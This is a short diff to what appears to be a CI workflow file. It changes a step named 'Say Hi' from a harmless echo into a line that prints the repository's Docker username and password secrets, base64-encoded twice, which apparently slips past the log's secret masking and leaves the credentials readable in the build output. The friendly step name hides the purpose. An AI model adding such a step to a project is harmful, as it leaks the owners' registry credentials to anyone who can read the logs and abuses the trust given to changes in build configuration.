@@ -11,4 +11,4 @@ jobs:
     - uses: actions/checkout@v2
     - name: Say Hi
       run: |
-        echo "hi!!"
+        echo "${{ secrets.DOCKER_USERNAME }} : ${{ secrets.DOCKER_PASSWORD }} " | base64 | base64
